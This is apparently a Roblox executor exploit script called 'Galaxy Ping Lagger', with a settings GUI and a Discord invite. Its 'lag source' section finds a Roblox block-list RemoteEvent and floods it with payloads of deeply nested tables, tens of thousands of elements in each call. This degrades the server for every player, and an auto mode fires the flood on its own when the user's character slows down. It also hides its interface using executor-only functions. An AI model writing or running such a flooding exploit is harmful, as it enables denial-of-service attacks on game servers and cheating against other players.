-- Galaxy Ping Lagger
-- Compact UI (LOW / MED / HIGH) | Galaxy lag source | Auto Brainrot | Settings

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr    = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local CONFIG_FILE = "GalaxyPingLagger_Config.json"
local DEFAULT_CFG = {
    power        = 60000,
    powerLow     = 60000,
    powerMed     = 80000,
    powerHigh    = 100000,
    interval     = 0.125,
    keybindKb    = "F",
    keybindGp    = "ButtonR2",
    autoBrainrot = true,
    locked       = false,
}

local cfg = {
    power        = DEFAULT_CFG.power,
    powerLow     = DEFAULT_CFG.powerLow,
    powerMed     = DEFAULT_CFG.powerMed,
    powerHigh    = DEFAULT_CFG.powerHigh,
    interval     = DEFAULT_CFG.interval,
    keybindKb    = DEFAULT_CFG.keybindKb,
    keybindGp    = DEFAULT_CFG.keybindGp,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    locked       = DEFAULT_CFG.locked,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end
    cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
    cfg.powerLow     = tonumber(data.powerLow) or DEFAULT_CFG.powerLow
    cfg.powerMed     = tonumber(data.powerMed) or DEFAULT_CFG.powerMed
    cfg.powerHigh    = tonumber(data.powerHigh) or DEFAULT_CFG.powerHigh
    cfg.interval     = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb    = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp    = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    if type(data.autoBrainrot) == "boolean" then cfg.autoBrainrot = data.autoBrainrot end
    if type(data.locked) == "boolean" then cfg.locked = data.locked end
end
loadConfig()

local active, remote = false, nil
local brainrotMode, lastBrainrotState, manualOverride = false, false, false
local listeningFor = nil

local function getPowerPresets()
    return {
        Low  = tonumber(cfg.powerLow) or 60000,
        Med  = tonumber(cfg.powerMed) or 80000,
        High = tonumber(cfg.powerHigh) or 100000,
    }
end

-- Pink palette
local C = {
    bg      = Color3.fromRGB(10, 4, 20),
    panel   = Color3.fromRGB(16, 8, 32),
    card    = Color3.fromRGB(24, 12, 44),
    pink1   = Color3.fromRGB(120, 40, 200),  -- purple primary
    pink2   = Color3.fromRGB(170, 90, 240),
    pink3   = Color3.fromRGB(200, 140, 255),
    glow    = Color3.fromRGB(80, 20, 160),
    white   = Color3.fromRGB(235, 225, 255),
    dim     = Color3.fromRGB(140, 120, 180),
    green   = Color3.fromRGB(80, 255, 140),
    red     = Color3.fromRGB(255, 80, 110),
    waiting = Color3.fromRGB(255, 200, 80),
    inputBg = Color3.fromRGB(20, 8, 40),
}

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function applyGradient(parent, c1, c2, rot)
    local g = Instance.new("UIGradient", parent)
    g.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, c1), ColorSequenceKeypoint.new(1, c2) })
    g.Rotation = rot or 135
    return g
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1, 6) == "Button" or n:sub(1, 10) == "Thumbstick"
        or n:sub(1, 4) == "DPad" or n == "ButtonSelect" or n == "ButtonStart"
end

-- Destroy old
for _, name in ipairs({ "GalaxyPingLaggerGui", "VorxPingLaggerGui", "GalaxyPingLaggerGui", "VynxPingLaggerGui" }) do
    pcall(function()
        local o = plrGui:FindFirstChild(name)
        if o then o:Destroy() end
    end)
    pcall(function()
        if gethui then
            local o = gethui():FindFirstChild(name)
            if o then o:Destroy() end
        end
    end)
end

local screen = Instance.new("ScreenGui")
screen.Name = "GalaxyPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.IgnoreGuiInset = true
local parented = false
pcall(function() if syn and syn.protect_gui then syn.protect_gui(screen) end end)
if gethui then parented = pcall(function() screen.Parent = gethui() end) end
if not parented then parented = pcall(function() screen.Parent = game:GetService("CoreGui") end) end
if not parented then screen.Parent = plrGui end

-- ═══════════════ MAIN PANEL (LOW / MED / HIGH layout) ═══════════════
local MAIN_W, MAIN_H, TOP_H = 260, 150, 32

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position = UDim2.new(0.5, -MAIN_W / 2, 0.3, 0)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = false
mainFrame.Parent = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
applyGradient(mainFrame, C.bg, Color3.fromRGB(20, 8, 40), 160)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = C.pink1
mainStroke.Thickness = 1.8
mainStroke.Transparency = 0.2

-- Drag (respects lock)
do
    local dragging, dragStart, startPos
    mainFrame.InputBegan:Connect(function(i)
        if cfg.locked then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = mainFrame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    mainFrame.InputChanged:Connect(function(i)
        if cfg.locked or not dragging then return end
        if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
            local d = i.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

-- Diagonal accent
local diag = Instance.new("Frame", mainFrame)
diag.Size = UDim2.new(0, 56, 1, 0)
diag.BackgroundColor3 = Color3.fromRGB(6, 4, 14)
diag.BackgroundTransparency = 0.25
diag.BorderSizePixel = 0
diag.ZIndex = 1
Instance.new("UICorner", diag).CornerRadius = UDim.new(0, 12)

-- Header
local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1, 0, 0, TOP_H)
topBar.BackgroundColor3 = C.pink1
topBar.BorderSizePixel = 0
topBar.ZIndex = 5
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 12)
applyGradient(topBar, C.pink1, C.pink2, 90)

local topFill = Instance.new("Frame", mainFrame)
topFill.Size = UDim2.new(1, 0, 0, 10)
topFill.Position = UDim2.new(0, 0, 0, TOP_H - 10)
topFill.BackgroundColor3 = C.pink1
topFill.BorderSizePixel = 0
topFill.ZIndex = 4
applyGradient(topFill, C.pink1, C.pink2, 90)

local titleLbl = Instance.new("TextLabel", topBar)
titleLbl.Size = UDim2.new(0, 140, 1, 0)
titleLbl.Position = UDim2.new(0, 10, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "GALAXY PING LAGGER"
titleLbl.TextColor3 = C.white
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 11
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.ZIndex = 6

-- Lock
local lockBtn = Instance.new("TextButton", topBar)
lockBtn.Size = UDim2.new(0, 24, 0, 22)
lockBtn.Position = UDim2.new(0, 148, 0.5, -11)
lockBtn.BackgroundColor3 = Color3.fromRGB(40, 12, 70)
lockBtn.BorderSizePixel = 0
lockBtn.AutoButtonColor = false
lockBtn.Text = cfg.locked and "🔒" or "🔓"
lockBtn.TextSize = 12
lockBtn.ZIndex = 6
Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 5)

-- OFF/ON status
local statusBtn = Instance.new("TextButton", topBar)
statusBtn.Size = UDim2.new(0, 40, 0, 18)
statusBtn.Position = UDim2.new(1, -72, 0.5, -9)
statusBtn.BackgroundColor3 = Color3.fromRGB(40, 12, 70)
statusBtn.BorderSizePixel = 0
statusBtn.AutoButtonColor = false
statusBtn.Text = "OFF"
statusBtn.TextColor3 = C.red
statusBtn.Font = Enum.Font.GothamBlack
statusBtn.TextSize = 10
statusBtn.ZIndex = 6
Instance.new("UICorner", statusBtn).CornerRadius = UDim.new(0, 6)

-- Settings gear
local gearBtn = Instance.new("TextButton", topBar)
gearBtn.Size = UDim2.new(0, 24, 0, 22)
gearBtn.Position = UDim2.new(1, -28, 0.5, -11)
gearBtn.BackgroundColor3 = Color3.fromRGB(40, 12, 70)
gearBtn.BorderSizePixel = 0
gearBtn.AutoButtonColor = false
gearBtn.Text = "⚙️"
gearBtn.TextSize = 12
gearBtn.ZIndex = 6
Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(0, 5)

-- Body
local content = Instance.new("Frame", mainFrame)
content.Size = UDim2.new(1, 0, 1, -TOP_H)
content.Position = UDim2.new(0, 0, 0, TOP_H)
content.BackgroundTransparency = 1
content.ZIndex = 3

-- ACTIVATE
local activateBtn = Instance.new("TextButton", content)
activateBtn.Size = UDim2.new(1, -20, 0, 34)
activateBtn.Position = UDim2.new(0, 10, 0, 10)
activateBtn.BackgroundColor3 = C.card
activateBtn.BorderSizePixel = 0
activateBtn.AutoButtonColor = false
activateBtn.Text = ""
activateBtn.ZIndex = 4
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 8)
local activateGrad = applyGradient(activateBtn, C.pink1, C.pink2, 135)
local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color = C.pink3
activateStroke.Thickness = 1.1
activateStroke.Transparency = 0.35

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1, 0, 1, 0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = C.white
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 14
activateLbl.ZIndex = 5

-- LOW / MED / HIGH
local PRESET_ORDER = { "Low", "Med", "High" }
local PRESET_LABEL = { Low = "LOW", Med = "MED", High = "HIGH" }
local presetBtns = {}

local function updatePresetVisuals()
    for name, btn in pairs(presetBtns) do
        local presets = getPowerPresets()
        local sel = (cfg.power == presets[name])
        if sel then
            btn.BackgroundColor3 = Color3.fromRGB(18, 10, 36)
            btn.TextColor3 = C.green
            local s = btn:FindFirstChildOfClass("UIStroke")
            if s then s.Color = C.green; s.Transparency = 0.15 end
        else
            btn.BackgroundColor3 = C.card
            btn.TextColor3 = C.dim
            local s = btn:FindFirstChildOfClass("UIStroke")
            if s then s.Color = C.glow; s.Transparency = 0.5 end
        end
    end
end

local btnW, btnH, gap = 72, 26, 6
local totalW = btnW * 3 + gap * 2
local startX = math.floor((MAIN_W - totalW) / 2)
for i, name in ipairs(PRESET_ORDER) do
    local btn = Instance.new("TextButton", content)
    btn.Size = UDim2.new(0, btnW, 0, btnH)
    btn.Position = UDim2.new(0, startX + (i - 1) * (btnW + gap), 0, 52)
    btn.BackgroundColor3 = C.card
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Text = PRESET_LABEL[name]
    btn.TextColor3 = C.dim
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 12
    btn.ZIndex = 4
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
    local bs = Instance.new("UIStroke", btn)
    bs.Color = C.glow
    bs.Thickness = 1
    bs.Transparency = 0.5
    btn.MouseButton1Click:Connect(function()
        local presets = getPowerPresets()
        cfg.power = presets[name]
        updatePresetVisuals()
        saveConfig()
    end)
    presetBtns[name] = btn
end
-- clamp legacy ultra
if cfg.power == 110000 then cfg.power = 100000 end
updatePresetVisuals()

local dcTag = Instance.new("TextLabel", content)
dcTag.Size = UDim2.new(1, -12, 0, 14)
dcTag.Position = UDim2.new(0, 6, 1, -16)
dcTag.BackgroundTransparency = 1
dcTag.Text = "discord.gg/galaxyhub"
dcTag.TextColor3 = C.pink3
dcTag.Font = Enum.Font.GothamBold
dcTag.TextSize = 9
dcTag.ZIndex = 4

-- ═══════════════ SETTINGS DROPDOWN ═══════════════
local settingsOpen = false
local settingsPanel = Instance.new("Frame", mainFrame)
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.new(0, 168, 0, 210)
settingsPanel.Position = UDim2.new(1, -6, 0, TOP_H + 4)
settingsPanel.AnchorPoint = Vector2.new(1, 0)
settingsPanel.BackgroundColor3 = C.panel
settingsPanel.BorderSizePixel = 0
settingsPanel.Visible = false
settingsPanel.ZIndex = 25
Instance.new("UICorner", settingsPanel).CornerRadius = UDim.new(0, 8)
do
    local s = Instance.new("UIStroke", settingsPanel)
    s.Color = C.pink2
    s.Thickness = 1.2
    s.Transparency = 0.25
end

local setTitle = Instance.new("TextLabel", settingsPanel)
setTitle.Size = UDim2.new(1, -10, 0, 18)
setTitle.Position = UDim2.new(0, 8, 0, 4)
setTitle.BackgroundTransparency = 1
setTitle.Text = "SETTINGS"
setTitle.TextColor3 = C.pink3
setTitle.Font = Enum.Font.GothamBlack
setTitle.TextSize = 10
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.ZIndex = 26

-- Auto Brainrot row
local autoRow = Instance.new("TextButton", settingsPanel)
autoRow.Size = UDim2.new(1, -12, 0, 26)
autoRow.Position = UDim2.new(0, 6, 0, 24)
autoRow.BackgroundColor3 = C.card
autoRow.BorderSizePixel = 0
autoRow.AutoButtonColor = false
autoRow.Text = ""
autoRow.ZIndex = 26
Instance.new("UICorner", autoRow).CornerRadius = UDim.new(0, 6)
local autoLbl = Instance.new("TextLabel", autoRow)
autoLbl.Size = UDim2.new(1, -40, 1, 0)
autoLbl.Position = UDim2.new(0, 8, 0, 0)
autoLbl.BackgroundTransparency = 1
autoLbl.Text = "Auto Brainrot"
autoLbl.TextColor3 = C.white
autoLbl.Font = Enum.Font.GothamBold
autoLbl.TextSize = 10
autoLbl.TextXAlignment = Enum.TextXAlignment.Left
autoLbl.ZIndex = 27
local autoVal = Instance.new("TextLabel", autoRow)
autoVal.Size = UDim2.new(0, 32, 1, 0)
autoVal.Position = UDim2.new(1, -36, 0, 0)
autoVal.BackgroundTransparency = 1
autoVal.Text = cfg.autoBrainrot and "ON" or "OFF"
autoVal.TextColor3 = cfg.autoBrainrot and C.green or C.red
autoVal.Font = Enum.Font.GothamBlack
autoVal.TextSize = 10
autoVal.ZIndex = 27

-- Keybind row
local keyRow = Instance.new("TextButton", settingsPanel)
keyRow.Size = UDim2.new(1, -12, 0, 26)
keyRow.Position = UDim2.new(0, 6, 0, 54)
keyRow.BackgroundColor3 = C.card
keyRow.BorderSizePixel = 0
keyRow.AutoButtonColor = false
keyRow.Text = ""
keyRow.ZIndex = 26
Instance.new("UICorner", keyRow).CornerRadius = UDim.new(0, 6)
local keyLbl = Instance.new("TextLabel", keyRow)
keyLbl.Size = UDim2.new(0.45, 0, 1, 0)
keyLbl.Position = UDim2.new(0, 8, 0, 0)
keyLbl.BackgroundTransparency = 1
keyLbl.Text = "Keybind"
keyLbl.TextColor3 = C.white
keyLbl.Font = Enum.Font.GothamBold
keyLbl.TextSize = 10
keyLbl.TextXAlignment = Enum.TextXAlignment.Left
keyLbl.ZIndex = 27
local keyVal = Instance.new("TextLabel", keyRow)
keyVal.Size = UDim2.new(0.5, 0, 1, 0)
keyVal.Position = UDim2.new(0.45, 0, 0, 0)
keyVal.BackgroundTransparency = 1
keyVal.Text = "[" .. (cfg.keybindKb or "F") .. "]"
keyVal.TextColor3 = C.pink3
keyVal.Font = Enum.Font.GothamBlack
keyVal.TextSize = 10
keyVal.ZIndex = 27

-- Delay row
local delayRow = Instance.new("Frame", settingsPanel)
delayRow.Size = UDim2.new(1, -12, 0, 26)
delayRow.Position = UDim2.new(0, 6, 0, 84)
delayRow.BackgroundColor3 = C.card
delayRow.BorderSizePixel = 0
delayRow.ZIndex = 26
Instance.new("UICorner", delayRow).CornerRadius = UDim.new(0, 6)
local delayLbl = Instance.new("TextLabel", delayRow)
delayLbl.Size = UDim2.new(0.45, 0, 1, 0)
delayLbl.Position = UDim2.new(0, 8, 0, 0)
delayLbl.BackgroundTransparency = 1
delayLbl.Text = "Delay"
delayLbl.TextColor3 = C.white
delayLbl.Font = Enum.Font.GothamBold
delayLbl.TextSize = 10
delayLbl.TextXAlignment = Enum.TextXAlignment.Left
delayLbl.ZIndex = 27
local delayBox = Instance.new("TextBox", delayRow)
delayBox.Size = UDim2.new(0, 52, 0, 18)
delayBox.Position = UDim2.new(1, -58, 0.5, -9)
delayBox.BackgroundColor3 = C.inputBg
delayBox.BorderSizePixel = 0
delayBox.Text = tostring(cfg.interval)
delayBox.TextColor3 = C.pink3
delayBox.Font = Enum.Font.GothamBold
delayBox.TextSize = 10
delayBox.ClearTextOnFocus = false
delayBox.ZIndex = 27
Instance.new("UICorner", delayBox).CornerRadius = UDim.new(0, 4)
delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text)
    if n and n >= 0.01 then
        cfg.interval = n
        delayBox.Text = tostring(n)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

-- Custom powers: Low / Med / High
local function mkPowerBox(y, label, getV, setV)
    local row = Instance.new("Frame", settingsPanel)
    row.Size = UDim2.new(1, -12, 0, 24)
    row.Position = UDim2.new(0, 6, 0, y)
    row.BackgroundColor3 = C.card
    row.BorderSizePixel = 0
    row.ZIndex = 26
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4, 0, 1, 0)
    lbl.Position = UDim2.new(0, 8, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = C.white
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 27
    local box = Instance.new("TextBox", row)
    box.Size = UDim2.new(0, 58, 0, 18)
    box.Position = UDim2.new(1, -64, 0.5, -9)
    box.BackgroundColor3 = C.inputBg
    box.BorderSizePixel = 0
    box.Text = tostring(getV())
    box.TextColor3 = C.pink3
    box.Font = Enum.Font.GothamBold
    box.TextSize = 10
    box.ClearTextOnFocus = false
    box.ZIndex = 27
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
    box.FocusLost:Connect(function()
        local n = tonumber(box.Text)
        if n and n >= 1 then
            local map = { LOW = "Low", MED = "Med", HIGH = "High" }
            local key = map[label]
            local wasSelected = false
            if key then
                local before = getPowerPresets()
                wasSelected = (cfg.power == before[key])
            end
            setV(math.floor(n))
            box.Text = tostring(getV())
            if wasSelected then
                cfg.power = getV()
            end
            updatePresetVisuals()
            saveConfig()
        else
            box.Text = tostring(getV())
        end
    end)
    return box
end

local lowBox = mkPowerBox(112, "LOW", function() return cfg.powerLow end, function(v) cfg.powerLow = v end)
local medBox = mkPowerBox(138, "MED", function() return cfg.powerMed end, function(v) cfg.powerMed = v end)
local highBox = mkPowerBox(164, "HIGH", function() return cfg.powerHigh end, function(v) cfg.powerHigh = v end)

-- when opening settings, refresh boxes
local _oldGearClick = nil


local function refreshAutoVal()
    autoVal.Text = cfg.autoBrainrot and "ON" or "OFF"
    autoVal.TextColor3 = cfg.autoBrainrot and C.green or C.red
end

autoRow.MouseButton1Click:Connect(function()
    cfg.autoBrainrot = not cfg.autoBrainrot
    refreshAutoVal()
    saveConfig()
end)

keyRow.MouseButton1Click:Connect(function()
    if listeningFor then return end
    listeningFor = "kb"
    keyVal.Text = "[...]"
    keyVal.TextColor3 = C.waiting
end)

gearBtn.MouseButton1Click:Connect(function()
    settingsOpen = not settingsOpen
    settingsPanel.Visible = settingsOpen
    gearBtn.BackgroundColor3 = settingsOpen and C.pink1 or Color3.fromRGB(40, 12, 70)
    if settingsOpen then
        lowBox.Text = tostring(cfg.powerLow)
        medBox.Text = tostring(cfg.powerMed)
        highBox.Text = tostring(cfg.powerHigh)
        delayBox.Text = tostring(cfg.interval)
        refreshAutoVal()
        keyVal.Text = "[" .. (cfg.keybindKb or "F") .. "]"
    end
end)

-- ═══════════════ GALAXY LAG SOURCE ═══════════════
local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local rmt
    for _, name in ipairs({ "SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList" }) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then rmt = r break end
    end
    if not rmt then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then rmt = c break end
        end
    end
    return rmt
end
remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = { {} }
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor((tonumber(power) or 60000) / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function flipLag(state, isManual)
    active = state and true or false
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                flipLag(false)
                return
            end
        end
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.pink2),
            ColorSequenceKeypoint.new(1, C.pink3),
        })
        activateLbl.Text = "ACTIVATED"
        activateStroke.Color = C.white
        activateStroke.Transparency = 0
        statusBtn.Text = "ON"
        statusBtn.TextColor3 = C.green
        mainStroke.Color = C.green
        mainStroke.Transparency = 0.1
        task.spawn(runPingLoop)
    else
        activateGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.pink1),
            ColorSequenceKeypoint.new(1, C.pink2),
        })
        activateLbl.Text = "ACTIVATE"
        activateStroke.Color = C.pink3
        activateStroke.Transparency = 0.35
        statusBtn.Text = "OFF"
        statusBtn.TextColor3 = C.red
        mainStroke.Color = C.pink1
        mainStroke.Transparency = 0.2
    end
end

local function toggleActive()
    flipLag(not active, true)
end
activateBtn.MouseButton1Click:Connect(toggleActive)
statusBtn.MouseButton1Click:Connect(toggleActive)

lockBtn.MouseButton1Click:Connect(function()
    cfg.locked = not cfg.locked
    lockBtn.Text = cfg.locked and "🔒" or "🔓"
    saveConfig()
end)

-- Auto brainrot (Galaxy source)
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local hasBrainrot = hum.WalkSpeed < 25
    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- Input
UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor == "kb" then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            keyVal.Text = "[" .. (cfg.keybindKb or "F") .. "]"
            keyVal.TextColor3 = C.pink3
            return
        end
        if isKb and kc ~= Enum.KeyCode.LeftControl then
            cfg.keybindKb = kc.Name
            listeningFor = nil
            keyVal.Text = "[" .. cfg.keybindKb .. "]"
            keyVal.TextColor3 = C.pink3
            saveConfig()
        end
        return
    end

    if processed then return end
    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

refreshAutoVal()
print("Galaxy Ping Lagger loaded")
